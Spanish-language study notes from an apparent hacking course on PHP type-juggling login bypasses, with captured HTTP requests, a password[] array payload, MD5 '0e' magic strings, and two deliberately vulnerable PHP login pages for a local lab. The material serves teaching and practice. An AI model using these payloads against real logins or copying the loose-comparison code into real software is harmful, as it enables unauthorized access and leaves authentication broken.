---
tags:
  - Web
  - Explotacion
  - Type-Juggling
---


# Notas

Con esta vulnerabilidad lo que buscamos es cambiar el tipo de dato que ingresamos comúnmente en un login para saltarnos este paso.

Esto se realiza de la siguiente manera:


## STRING -> ARRAY (PHP antiguas)

Condiciones para que se de la vulnerabilidad:
- Versión de php antigua
- Entrada de usuario mal comprobada

Capturamos la petición y vemos que se esta enviando:

```http
POST / HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://127.0.0.1/
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://127.0.0.1
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

usuario=admin&password=gfdxgdf
```

Lo que vamos a realizar es que la entrada del password en vez de ser un `string` que sea un `array` de la siguiente manera:

```http
POST / HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://127.0.0.1/
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://127.0.0.1
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

usuario=admin&password[]=
```

**Esto nos dará acceso**

## Valor exponencial

Condiciones para que se de la vulnerabilidad:
- La contraseña en md5 tiene que empezar por 0e
- La comparativa tiene que tener doble ==

Ingresando valores exponenciales como 0e48762759863w ya que al hacer la comparación va a pasar ya que es igual a 0.

**Strings mágicos que podemos utilizar:**

echo -n 240610708 | md5sum

echo -n QNKCDZO | md5sum

echo -n aabg7XSs | md5sum


# Hack4u

Un ataque de **Type Juggling** (o “**cambio de tipo**” en español) es una técnica utilizada en programación para **manipular** el **tipo de dato** de una variable con el fin de engañar a un programa y hacer que éste haga algo que no debería.

La mayoría de los lenguajes de programación utilizan tipos de datos para clasificar la información almacenada en una variable, como enteros, cadenas, flotantes, booleanos, etc. Los programas utilizan estos tipos de datos para realizar operaciones matemáticas, comparaciones y otras tareas específicas. Sin embargo, los atacantes pueden explotar vulnerabilidades en los programas que no validan adecuadamente los tipos de datos que se les proporcionan.

En un ataque de Type Juggling, un atacante manipula los datos de entrada del programa para cambiar el tipo de dato de una variable. Por ejemplo, el atacante podría proporcionar una cadena de caracteres que “se parece” a un número entero, pero que en realidad no lo es. Si el programa no valida adecuadamente el tipo de dato de la variable, podría intentar realizar operaciones matemáticas en esa variable y obtener resultados inesperados.

Un ejemplo común de cómo se puede utilizar un ataque de Type Juggling para burlar la autenticación es en un sistema que utiliza comparaciones de cadena para verificar las contraseñas de los usuarios. En lugar de proporcionar una contraseña válida, el atacante podría proporcionar una cadena que se parece a una contraseña válida, pero que en realidad no lo es.

Por ejemplo, en PHP, una cadena que comienza con un número se convierte automáticamente en un número si se utiliza en una comparación numérica. Por lo tanto, si el atacante proporciona una cadena que comienza con el número **cero** (**0**), como “**00123**“, el programa la convertirá en el número entero **123**.

Aquí se puede ver un ejemplo:

![[Pasted image 20250416135953.png]]

Si la contraseña almacenada en el sistema también se almacena como un número entero (en lugar de como una cadena), la comparación de la contraseña del atacante con la contraseña almacenada podría ser exitosa, lo que permitiría al atacante eludir la autenticación y obtener acceso no autorizado al sistema.

# Laboratorios

## Laboratorio casero

### Contraseña = string

En la ruta /var/www/html creamos un archivo index.php con el siguiente contenido:

```php
<html>
  <font color="red"><center><h1>Secure Login Page</h1></center></font>
  <hr>
  <?php echo basename($_SERVER['PHP_SELF']); ?>
  <body style="background-color:powerblue;">
    <center>
      <form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
        Usuario: <input type="text" name="usuario" id="usuario" size="30">
        Password: <input type="password" name="password" id="password" size="30">
        <input type="submit" value="Login">
      </form>
    </center>
    <hr>
    <?php
      $USER = "admin";
      $PASSWORD = "admin@$$121232";

      if(isset($_POST['usuario']) && isset($_POST['password'])){
        if($_POST['usuario'] == $USER){
          if(strcmp($_POST['password'], $PASSWORD) == 0){
            echo "[+] Acceso garantizado, bienvenido usuario admin";
          }else{
            echo "[!] La contraseña proporcionada no es válida";
          }
        }else{
          echo "[!] El usuario introducido no es correcto";
        }
      }
    ?>

  </body>
</html>
```

### Contraseña = 

```php
<html>
  <font color="red"><center><h1>Secure Login Page</h1></center></font>
  <hr>
  <?php echo basename($_SERVER['PHP_SELF']); ?>
  <body style="background-color:powerblue;">
    <center>
      <form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
        Usuario: <input type="text" name="usuario" id="usuario" size="30">
        Password: <input type="password" name="password" id="password" size="30">
        <input type="submit" value="Login">
      </form>
    </center>
    <hr>
    <?php
      $USER = "admin";
      $PASSWORD = 0e087386482136013740957780965295;

      if(!empty($_POST['usuario']) && !empty($_POST['password'])){
		$password_input = $_POST['password'];
		$password_input = md5($password_input);
        if($_POST['usuario'] == $USER){
          if($password_input == $PASSWORD){
            echo "[+] Acceso garantizado, bienvenido usuario admin";
          }else{
            echo "[!] La contraseña proporcionada no es válida";
          }
        }else{
          echo "[!] El usuario introducido no es correcto";
        }
      }
    ?>

  </body>
</html>
```